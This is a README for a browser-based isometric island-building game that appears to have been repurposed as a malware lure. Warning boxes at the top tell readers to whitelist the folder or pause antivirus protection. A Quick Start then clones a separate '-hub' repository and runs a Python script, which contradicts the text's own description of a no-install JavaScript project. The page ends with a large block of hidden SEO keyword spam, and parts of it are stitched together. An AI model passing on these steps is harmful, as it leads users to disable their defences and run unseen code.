# Mykonos Island Voxels


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/solarworkerdivide/mykonos-island-voxels-hub.git
cd mykonos-island-voxels-hub
python run.py
```


A browser-based isometric island builder with the soft, sun-bleached
Mediterranean look of Mykonos: cobalt-blue domes on whitewashed walls,
bougainvillea spilling over stone, olive trees, windmills, narrow
cobble paths, and a sea you can carve with a click.

It's a small, self-contained creative toy — drop blocks on a 14×14 grid
and a tiny village builds itself in front of you. There's no goal,
no resource grind, no scoring; just the puzzle-piece pleasure of
arranging things until they look right.

**🌐 Play it: <https://mykonos-island-voxels.netlify.app>**

![Mykonos Island Voxels — example scene](full%20city.png)

---

## Features

- **Click-to-build isometric grid.** Pick an asset from the right-side
  palette, click a cell, and it pops in with an elastic placement
  animation.
- **One-click "Fill with grass"** to carpet the island and start
  arranging in seconds.
- **75+ painterly assets** organised into terrain, nature, props, water,
  and buildings — chapels, windmills, two-story villas, cypress, olive
  trees, agave, wells, lanterns, fences, bridges, and more.
- **Touch-first mobile UI.** Tap to place, long-press to erase, drag
  to brush, two-finger pinch and pan. Layout adapts from desktop down
  to small phones with safe-area insets for the iPhone notch.
- **High-fidelity asset pipeline.** Source PNGs are pre-rendered at
  6× display resolution at load time, baked into high-DPI cached
  layers, then composited per frame so the canvas stays crisp at
  every zoom on every screen density.
- **Auto-save.** Your island is persisted to `localStorage` and
  re-loaded on the next visit.
- **Tasteful sound design.** Distinct placement sounds for water,
  stone, wood, small vegetation, large vegetation, and UI clicks,
  with debounced overlap so brush-painting doesn't flood the bus.
- **Pure ES modules.** No bundler, no transpiler, no `node_modules` —
  open `index.html` and it runs.

## Controls

### Mouse + keyboard

| Input | Action |
|---|---|
| Click | Place selected asset |
| Drag | Brush-place across cells |
| Right click | Erase tile |
| Right drag | Brush-erase |
| Shift + drag | Pan camera |
| Scroll wheel | Zoom |
| `H` / `V` | Flip the placement preview |
| `E` | Toggle erase mode |
| `G` | Toggle grid overlay |
| `1`–`5` | Switch palette categories |
| `S` / `R` | Save / reset |

### Touch

| Gesture | Action |
|---|---|
| Tap | Place selected asset |
| Drag | Brush-place across cells |
| Long-press (~420 ms) | Erase the tile under your finger |
| Two-finger pinch | Zoom |
| Two-finger drag | Pan camera |


# any one of these from the project root:
python3 -m http.server 8000
npx serve .
npx http-server -c-1 .
```

Then open <http://localhost:8000>.


## Project layout

```
.
├── index.html               # entry point
├── styles.css               # the entire UI (no framework)
├── src/
│   ├── main.js              # boot, asset loading, starter scene
│   ├── config.js            # grid size, tile dims, palette, debug flags
│   ├── core/
│   │   ├── Game.js          # game state + tool dispatch
│   │   ├── Camera.js        # pan / zoom / change notifications
│   │   ├── Renderer.js      # layered canvas caching + animations
│   │   └── InputManager.js  # mouse + touch + keyboard
│   ├── grid/
│   │   ├── IsoGrid.js       # screen ↔ cell math
│   │   └── TileMap.js       # terrain + objects, occupancy index
│   ├── building/
│   │   └── PlacementSystem.js
│   ├── assets/
│   │   ├── assetManifest.js # the 75+ asset definitions
│   │   ├── assetLoader.js   # PNG → display canvas + shadow canvas
│   │   ├── imageToAsset.js  # silhouette extraction, anchor inference
│   │   └── voxelRenderer.js # procedural fallback when PNGs missing
│   ├── ui/
│   │   ├── UIManager.js
│   │   ├── Toolbar.js
│   │   ├── AssetPalette.js
│   │   ├── HUD.js
│   │   └── Audio.js         # WebAudio clip routing + debouncing
│   └── persistence/
│       └── SaveSystem.js
├── assets/                  # PNG asset pack (pre-generated)
├── *.ogg                    # placement / UI sound effects
├── netlify.toml
└── netlify-build.mjs
```

## Architecture notes

A few choices worth flagging if you want to hack on the renderer:

- **Layered cache rendering.** `Renderer.js` keeps four cache canvases:
  a screen-space backdrop + vignette pair (rebuilt on resize), a
  world-space platform (rebuilt on grid resize), a world-space terrain
  layer (rebuilt when the terrain version counter changes), and a
  world-space static-objects layer (rebuilt on add/remove). Each frame
  the renderer composites these caches and overlays only the currently
  animating tiles. Idle frames are essentially free.
- **High-DPI cache canvases.** Cache canvases are sized at
  `world × CACHE_SCALE` (2× on standard displays, 3× on retina) so
  that even after the camera scales them up, the pixels are at or
  near final on-screen resolution. The asset displayCanvases are
  pre-rendered at up to 6× their reference size, so detail flows
  through without any "softening" intermediate.
- **Spatial occupancy index in `TileMap`.** Object lookup and free-cell
  checks are O(1) per cell instead of O(N) over the object list.
- **Dirty-flag rendering.** `markDirty()` is called from camera /
  input / tool transitions; the loop early-exits when the scene is
  static and no animations are pending.

## Contributing

PRs welcome. Please:

- Keep it framework-free — no bundlers, no transpilers, no
  `node_modules` for the runtime.
- Keep the asset count modest and the visual style coherent
  (cobalt-on-cream, soft shadows, gentle elastic motion).
- Don't add per-frame `ctx.filter`, ImageBitmap shenanigans, or
  anything that would re-introduce frame drops at heavy scenes.
  The renderer's caching invariants are load-bearing.

## License

MIT — see [LICENSE](LICENSE).

The PNG asset pack in `assets/` is released under the same license,
generated for this project. Audio clips were authored separately;
see file metadata if you need to attribute them.


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- mykonos-island-voxels-hub - tool utility software - download install setup -->
<!-- install open source mykonos-island-voxels-hub | configurable mykonos-island-voxels-hub service | open source mykonos-island-voxels-hub mirror | mykonos island voxels hub fix | demo best mykonos-island-voxels-hub client | modern mykonos-island-voxels-hub software | start mykonos-island-voxels-hub api | 2025 mykonos-island-voxels-hub | start mykonos-island-voxels-hub fork | how to configure native mykonos-island-voxels-hub | git clone mykonos-island-voxels-hub | how to configure mykonos-island-voxels-hub scanner | self hosted mykonos-island-voxels-hub decoder | mykonos island voxels hub download | macos mykonos-island-voxels-hub converter | download mykonos-island-voxels-hub logger | start open source mykonos-island-voxels-hub | mykonos-island-voxels-hub uploader | open source mykonos-island-voxels-hub extractor | getting started mykonos-island-voxels-hub extractor | easy mykonos-island-voxels-hub copy | install mykonos-island-voxels-hub | mykonos-island-voxels-hub downloader | beginner mykonos-island-voxels-hub module | beginner extensible mykonos-island-voxels-hub | docs secure mykonos-island-voxels-hub engine | download for mac mykonos-island-voxels-hub parser | open source mykonos-island-voxels-hub platform | mykonos-island-voxels-hub port | high performance mykonos-island-voxels-hub monitor | install powerful mykonos-island-voxels-hub | quickstart top mykonos-island-voxels-hub plugin | mykonos-island-voxels-hub engine | latest version safe mykonos-island-voxels-hub | cross platform mykonos-island-voxels-hub wrapper | run on mac mykonos-island-voxels-hub service | fast mykonos-island-voxels-hub extractor | source code mykonos-island-voxels-hub library | native mykonos-island-voxels-hub downloader | how to use mykonos-island-voxels-hub | portable mykonos-island-voxels-hub | wiki fast mykonos-island-voxels-hub | get mykonos-island-voxels-hub encoder | open source mykonos-island-voxels-hub addon | documentation mykonos-island-voxels-hub downloader | safe mykonos-island-voxels-hub optimizer | tar.gz mykonos-island-voxels-hub server | mykonos-island-voxels-hub wrapper | secure mykonos-island-voxels-hub api | linux mykonos-island-voxels-hub validator -->
<!-- cross platform mykonos-island-voxels-hub | best mykonos-island-voxels-hub software | source code mykonos-island-voxels-hub mobile | get best mykonos-island-voxels-hub port | portable mykonos-island-voxels-hub builder | github mykonos-island-voxels-hub application | how to install mykonos-island-voxels-hub | open source mykonos-island-voxels-hub engine | modular mykonos-island-voxels-hub addon | reliable mykonos-island-voxels-hub alternative | free free mykonos-island-voxels-hub | setup easy mykonos-island-voxels-hub module | wiki mykonos-island-voxels-hub monitor | github mykonos-island-voxels-hub converter | local mykonos-island-voxels-hub desktop | how to setup mykonos-island-voxels-hub platform | download for linux mykonos-island-voxels-hub compressor | local mykonos-island-voxels-hub app | download for linux mykonos-island-voxels-hub mirror | mykonos-island-voxels-hub checker | online mykonos-island-voxels-hub clone | walkthrough mykonos-island-voxels-hub | quick start production ready mykonos-island-voxels-hub converter | 2026 mykonos-island-voxels-hub extractor | run on mac mykonos-island-voxels-hub downloader | download for mac mykonos-island-voxels-hub | offline mykonos-island-voxels-hub package | zip mykonos-island-voxels-hub | how to run mykonos-island-voxels-hub tool | windows high performance mykonos-island-voxels-hub | reliable mykonos-island-voxels-hub client | stable mykonos-island-voxels-hub desktop | open mykonos-island-voxels-hub converter | 2026 self hosted mykonos-island-voxels-hub | 2025 modular mykonos-island-voxels-hub | arch mykonos-island-voxels-hub decoder | arch mykonos-island-voxels-hub | github mykonos-island-voxels-hub extension | macos native mykonos-island-voxels-hub | download for windows mykonos-island-voxels-hub editor | debian mykonos-island-voxels-hub alternative | how to use mykonos-island-voxels-hub program | ubuntu mykonos-island-voxels-hub api | easy mykonos-island-voxels-hub application | mykonos island voxels hub ci cd | quick start mykonos-island-voxels-hub validator | github mykonos-island-voxels-hub uploader | launch mykonos-island-voxels-hub tester | new version mykonos-island-voxels-hub addon | mykonos island voxels hub alternative -->
<!-- zip safe mykonos-island-voxels-hub downloader | start lightweight mykonos-island-voxels-hub | docs mykonos-island-voxels-hub tool | open source mykonos-island-voxels-hub module | guide online mykonos-island-voxels-hub library | top mykonos island voxels hub | offline mykonos-island-voxels-hub tester | top mykonos-island-voxels-hub | advanced mykonos-island-voxels-hub engine | configurable mykonos-island-voxels-hub extension | mykonos island voxels hub automation | local mykonos-island-voxels-hub decoder | modular mykonos-island-voxels-hub mirror | zip mykonos-island-voxels-hub port | free download native mykonos-island-voxels-hub | arch mykonos-island-voxels-hub gui | how to configure modern mykonos-island-voxels-hub package | install mykonos-island-voxels-hub reader | fedora native mykonos-island-voxels-hub | zip mykonos-island-voxels-hub alternative | how to setup modular mykonos-island-voxels-hub | free mykonos-island-voxels-hub gui | online mykonos-island-voxels-hub viewer | beginner mykonos-island-voxels-hub analyzer | low latency mykonos-island-voxels-hub program | install mykonos-island-voxels-hub fork | mykonos-island-voxels-hub reader | 2025 mykonos-island-voxels-hub package | github mykonos-island-voxels-hub clone | top mykonos-island-voxels-hub parser | git clone mykonos-island-voxels-hub plugin | configurable mykonos-island-voxels-hub framework | windows mykonos-island-voxels-hub replacement | execute mykonos-island-voxels-hub | getting started self hosted mykonos-island-voxels-hub software | 2025 offline mykonos-island-voxels-hub | mykonos-island-voxels-hub copy | how to configure mykonos-island-voxels-hub sdk | mykonos-island-voxels-hub plugin | configure mykonos-island-voxels-hub mobile | run mykonos-island-voxels-hub generator | source code mykonos-island-voxels-hub uploader | how to deploy mykonos-island-voxels-hub app | mykonos-island-voxels-hub parser | fast mykonos-island-voxels-hub cli | build mykonos-island-voxels-hub plugin | centos mykonos-island-voxels-hub | run on linux mykonos-island-voxels-hub api | install mykonos-island-voxels-hub mirror | download mykonos-island-voxels-hub -->
<!-- git clone mykonos-island-voxels-hub logger | 2025 native mykonos-island-voxels-hub clone | launch mykonos-island-voxels-hub mobile | git clone mykonos-island-voxels-hub library | get mykonos-island-voxels-hub | download for mac mykonos-island-voxels-hub binding | mykonos island voxels hub saas | new version mykonos-island-voxels-hub | best mykonos-island-voxels-hub platform | how to download mykonos-island-voxels-hub program | offline mykonos-island-voxels-hub | new version mykonos-island-voxels-hub engine | ubuntu cross platform mykonos-island-voxels-hub | run on mac mykonos-island-voxels-hub viewer | 2026 mykonos-island-voxels-hub mobile | how to run mykonos-island-voxels-hub tester | execute mykonos-island-voxels-hub compressor | start powerful mykonos-island-voxels-hub | download for mac mykonos-island-voxels-hub package | top mykonos-island-voxels-hub encoder | compile mykonos-island-voxels-hub | how to download modular mykonos-island-voxels-hub | tar.gz mykonos-island-voxels-hub binding | reliable mykonos-island-voxels-hub | quickstart mykonos-island-voxels-hub mirror | how to download mykonos-island-voxels-hub tracker | configure cross platform mykonos-island-voxels-hub | 2025 minimal mykonos-island-voxels-hub | mykonos-island-voxels-hub addon | github mykonos-island-voxels-hub generator | free download mykonos-island-voxels-hub wrapper | lightweight mykonos-island-voxels-hub converter | run on mac mykonos-island-voxels-hub reader | top mykonos-island-voxels-hub checker | mykonos island voxels hub setup | extensible mykonos-island-voxels-hub software | mykonos island voxels hub reference | modern mykonos-island-voxels-hub library | setup mykonos-island-voxels-hub copy | how to configure mykonos-island-voxels-hub client | how to build mykonos-island-voxels-hub creator | github mykonos-island-voxels-hub engine | safe mykonos-island-voxels-hub clone | sample mykonos-island-voxels-hub decoder | compile mykonos-island-voxels-hub monitor | is mykonos island voxels hub good | mykonos island voxels hub blog | examples mykonos-island-voxels-hub api | tar.gz mykonos-island-voxels-hub client | linux mykonos-island-voxels-hub tracker -->
<!-- mykonos-island-voxels-hub desktop | macos mykonos-island-voxels-hub framework | low latency mykonos-island-voxels-hub api | documentation customizable mykonos-island-voxels-hub | execute modern mykonos-island-voxels-hub | github mykonos-island-voxels-hub | mykonos island voxels hub demo | centos mykonos-island-voxels-hub logger | run on windows safe mykonos-island-voxels-hub | tutorial mykonos-island-voxels-hub | download for linux extensible mykonos-island-voxels-hub | easy mykonos-island-voxels-hub optimizer | compile mykonos-island-voxels-hub editor | safe mykonos-island-voxels-hub encoder | free mykonos-island-voxels-hub package | 2026 mykonos-island-voxels-hub server | customizable mykonos-island-voxels-hub program | free download mykonos-island-voxels-hub | wiki mykonos-island-voxels-hub reader | docs mykonos-island-voxels-hub program | download for linux native mykonos-island-voxels-hub | example mykonos-island-voxels-hub utility | safe mykonos-island-voxels-hub replacement | documentation mykonos-island-voxels-hub converter | configurable mykonos-island-voxels-hub library | top mykonos-island-voxels-hub port | mykonos-island-voxels-hub monitor | mykonos island voxels hub error | execute mykonos-island-voxels-hub software | free mykonos-island-voxels-hub library | top mykonos-island-voxels-hub mirror | arch mykonos-island-voxels-hub program | mykonos-island-voxels-hub server | guide mykonos-island-voxels-hub extension | secure mykonos-island-voxels-hub | modular mykonos-island-voxels-hub | modular mykonos-island-voxels-hub fork | latest version mykonos-island-voxels-hub | mykonos island voxels hub bug | free secure mykonos-island-voxels-hub | run on windows mykonos-island-voxels-hub software | configure mykonos-island-voxels-hub | getting started portable mykonos-island-voxels-hub | best mykonos-island-voxels-hub | safe mykonos-island-voxels-hub parser | launch open source mykonos-island-voxels-hub | how to setup modern mykonos-island-voxels-hub | best mykonos-island-voxels-hub library | docs mykonos-island-voxels-hub | top mykonos-island-voxels-hub framework -->
<!-- mykonos-island-voxels-hub software | updated safe mykonos-island-voxels-hub | quickstart mykonos-island-voxels-hub server | start mykonos-island-voxels-hub encoder | beginner mykonos-island-voxels-hub application | extensible mykonos-island-voxels-hub plugin | modular mykonos-island-voxels-hub optimizer | guide free mykonos-island-voxels-hub | lightweight mykonos-island-voxels-hub logger | debian mykonos-island-voxels-hub tracker | native mykonos-island-voxels-hub | minimal mykonos-island-voxels-hub decoder | run self hosted mykonos-island-voxels-hub copy | updated mykonos-island-voxels-hub tester | local mykonos-island-voxels-hub wrapper | linux self hosted mykonos-island-voxels-hub engine | extensible mykonos-island-voxels-hub library | zip mykonos-island-voxels-hub addon | how to install reliable mykonos-island-voxels-hub checker | mykonos island voxels hub not working | execute mykonos-island-voxels-hub client | 2026 mykonos-island-voxels-hub mirror | wiki mykonos-island-voxels-hub | how to download mykonos-island-voxels-hub extractor | linux mykonos-island-voxels-hub server | how to use mykonos-island-voxels-hub client | getting started mykonos-island-voxels-hub mobile | top mykonos-island-voxels-hub plugin | 2025 mykonos-island-voxels-hub alternative | native mykonos-island-voxels-hub service | sample cross platform mykonos-island-voxels-hub | run mykonos-island-voxels-hub debugger | how to run production ready mykonos-island-voxels-hub plugin | how to download mykonos-island-voxels-hub fork | free download mykonos-island-voxels-hub mobile | how to install mykonos-island-voxels-hub client | high performance mykonos-island-voxels-hub extension | mykonos-island-voxels-hub clone | download for mac safe mykonos-island-voxels-hub | centos advanced mykonos-island-voxels-hub | deploy mykonos-island-voxels-hub extractor | install mykonos-island-voxels-hub replacement | safe mykonos-island-voxels-hub | build native mykonos-island-voxels-hub tester | mykonos island voxels hub documentation | run on mac mykonos-island-voxels-hub decoder | download for mac mykonos-island-voxels-hub analyzer | mykonos-island-voxels-hub utility | install mykonos-island-voxels-hub plugin | fedora online mykonos-island-voxels-hub -->
<!-- simple mykonos-island-voxels-hub | portable mykonos-island-voxels-hub api | is mykonos island voxels hub safe | open mykonos-island-voxels-hub | quick start simple mykonos-island-voxels-hub | secure mykonos-island-voxels-hub addon | secure mykonos-island-voxels-hub optimizer | example mykonos-island-voxels-hub | how to install mykonos-island-voxels-hub builder | build mykonos-island-voxels-hub | native mykonos-island-voxels-hub tester | windows cross platform mykonos-island-voxels-hub clone | high performance mykonos-island-voxels-hub program | run on windows mykonos-island-voxels-hub tool | native mykonos-island-voxels-hub utility | free mykonos-island-voxels-hub encoder | best mykonos-island-voxels-hub fork | customizable mykonos-island-voxels-hub fork | getting started mykonos-island-voxels-hub utility | example mykonos-island-voxels-hub uploader | start mykonos-island-voxels-hub | safe mykonos-island-voxels-hub debugger | compile mykonos-island-voxels-hub app | free download powerful mykonos-island-voxels-hub logger | demo mykonos-island-voxels-hub plugin | configurable mykonos-island-voxels-hub optimizer | portable mykonos-island-voxels-hub client | fedora free mykonos-island-voxels-hub | mykonos-island-voxels-hub gui | production ready mykonos-island-voxels-hub | macos mykonos-island-voxels-hub replacement | mykonos-island-voxels-hub optimizer | windows open source mykonos-island-voxels-hub | mykonos-island-voxels-hub viewer | examples portable mykonos-island-voxels-hub | get mykonos-island-voxels-hub platform | windows online mykonos-island-voxels-hub server | use simple mykonos-island-voxels-hub | free mykonos-island-voxels-hub | configure mykonos-island-voxels-hub plugin | mykonos island voxels hub webinar | how to setup mykonos-island-voxels-hub | debian mykonos-island-voxels-hub | secure mykonos-island-voxels-hub fork | build mykonos-island-voxels-hub port | documentation mykonos-island-voxels-hub | offline mykonos-island-voxels-hub engine | ubuntu extensible mykonos-island-voxels-hub scanner | powerful mykonos-island-voxels-hub debugger | cross platform mykonos-island-voxels-hub tool -->
<!-- fast mykonos-island-voxels-hub port | safe mykonos-island-voxels-hub software | fedora high performance mykonos-island-voxels-hub | online mykonos-island-voxels-hub tool | quick start self hosted mykonos-island-voxels-hub | use mykonos-island-voxels-hub copy | how to download best mykonos-island-voxels-hub app | how to configure mykonos-island-voxels-hub | fast mykonos-island-voxels-hub | updated mykonos-island-voxels-hub | launch mykonos-island-voxels-hub generator | setup lightweight mykonos-island-voxels-hub | how to build mykonos-island-voxels-hub copy | cross platform mykonos-island-voxels-hub tester | open mykonos-island-voxels-hub mirror | mykonos-island-voxels-hub framework | demo mykonos-island-voxels-hub mobile | setup mykonos-island-voxels-hub | start mykonos-island-voxels-hub checker | low latency mykonos-island-voxels-hub builder | self hosted mykonos-island-voxels-hub | latest version simple mykonos-island-voxels-hub | is mykonos island voxels hub legit | fedora github mykonos-island-voxels-hub | deploy mykonos-island-voxels-hub alternative | how to deploy mykonos-island-voxels-hub debugger | zip mykonos-island-voxels-hub tracker | low latency mykonos-island-voxels-hub addon | mykonos-island-voxels-hub module | run on linux mykonos-island-voxels-hub plugin | examples mykonos-island-voxels-hub engine | customizable mykonos-island-voxels-hub plugin | mykonos-island-voxels-hub compressor | new version reliable mykonos-island-voxels-hub | mykonos island voxels hub best practice | tutorial mykonos-island-voxels-hub port | debian mykonos-island-voxels-hub platform | mykonos island voxels hub project | demo portable mykonos-island-voxels-hub library | how to run mykonos-island-voxels-hub | guide mykonos-island-voxels-hub api | free mykonos-island-voxels-hub sdk | compile lightweight mykonos-island-voxels-hub | centos native mykonos-island-voxels-hub | walkthrough mykonos-island-voxels-hub reader | use mykonos-island-voxels-hub web | mykonos-island-voxels-hub web | modular mykonos-island-voxels-hub wrapper | download for linux mykonos-island-voxels-hub | execute mykonos-island-voxels-hub application -->
<!-- easy mykonos-island-voxels-hub | latest version mykonos-island-voxels-hub reader | modern mykonos-island-voxels-hub extension | how to use mykonos-island-voxels-hub plugin | arch mykonos-island-voxels-hub replacement | mykonos-island-voxels-hub builder | offline mykonos-island-voxels-hub alternative | mykonos-island-voxels-hub service | download for windows mykonos-island-voxels-hub encoder | mykonos-island-voxels-hub analyzer | build mykonos-island-voxels-hub gui | download for linux mykonos-island-voxels-hub alternative | free download mykonos-island-voxels-hub sdk | mykonos-island-voxels-hub api | getting started mykonos-island-voxels-hub | portable mykonos-island-voxels-hub server | launch mykonos-island-voxels-hub compressor | customizable mykonos-island-voxels-hub extractor | free mykonos-island-voxels-hub viewer | walkthrough best mykonos-island-voxels-hub | compile best mykonos-island-voxels-hub | examples mykonos-island-voxels-hub sdk | use mykonos-island-voxels-hub application | macos mykonos-island-voxels-hub creator | setup mykonos-island-voxels-hub engine | macos mykonos-island-voxels-hub | mykonos-island-voxels-hub package | modern mykonos-island-voxels-hub | use production ready mykonos-island-voxels-hub addon | mykonos island voxels hub guide | github powerful mykonos-island-voxels-hub uploader | download for mac powerful mykonos-island-voxels-hub | fedora best mykonos-island-voxels-hub | beginner high performance mykonos-island-voxels-hub fork | mykonos island voxels hub workflow | centos top mykonos-island-voxels-hub | centos mykonos-island-voxels-hub validator | stable mykonos-island-voxels-hub service | mykonos island voxels hub cheat sheet | source code mykonos-island-voxels-hub utility | run on windows mykonos-island-voxels-hub converter | mykonos-island-voxels-hub fork | macos mykonos-island-voxels-hub viewer | docs mykonos-island-voxels-hub plugin | docs reliable mykonos-island-voxels-hub utility | run on linux mykonos-island-voxels-hub alternative | setup mykonos-island-voxels-hub wrapper | demo mykonos-island-voxels-hub | free mykonos-island-voxels-hub parser | updated mykonos-island-voxels-hub plugin -->
<!-- mykonos island voxels hub example | mykonos island voxels hub course | walkthrough mykonos-island-voxels-hub software | mykonos-island-voxels-hub logger | mykonos island voxels hub benchmark | quickstart mykonos-island-voxels-hub alternative | high performance mykonos-island-voxels-hub | download extensible mykonos-island-voxels-hub generator | guide mykonos-island-voxels-hub cli | download mykonos-island-voxels-hub client | download mykonos-island-voxels-hub module | docs mykonos-island-voxels-hub debugger | get mykonos-island-voxels-hub checker | local mykonos-island-voxels-hub platform | how to setup secure mykonos-island-voxels-hub | run mykonos-island-voxels-hub platform | new version mykonos-island-voxels-hub api | run on linux mykonos-island-voxels-hub web | configure mykonos-island-voxels-hub scanner | configure modular mykonos-island-voxels-hub | offline mykonos-island-voxels-hub extractor | mykonos-island-voxels-hub tracker | stable mykonos-island-voxels-hub | latest version mykonos-island-voxels-hub extractor | best mykonos-island-voxels-hub plugin | deploy low latency mykonos-island-voxels-hub desktop | download for linux mykonos-island-voxels-hub app | execute mykonos-island-voxels-hub logger | source code mykonos-island-voxels-hub platform | guide mykonos-island-voxels-hub viewer | mykonos-island-voxels-hub sdk | deploy mykonos-island-voxels-hub clone | portable mykonos-island-voxels-hub tool | fedora mykonos-island-voxels-hub decoder | online mykonos-island-voxels-hub | secure mykonos-island-voxels-hub app | get mykonos-island-voxels-hub client | fedora mykonos-island-voxels-hub software | documentation mykonos-island-voxels-hub desktop | mykonos-island-voxels-hub scanner | safe mykonos-island-voxels-hub builder | walkthrough mykonos-island-voxels-hub package | windows mykonos-island-voxels-hub extractor | free mykonos-island-voxels-hub api | offline mykonos-island-voxels-hub replacement | walkthrough low latency mykonos-island-voxels-hub | cross platform mykonos-island-voxels-hub server | run on linux mykonos-island-voxels-hub validator | fedora mykonos-island-voxels-hub tester | mykonos-island-voxels-hub editor -->

<!-- Last updated: 2026-06-09 19:09:28 -->
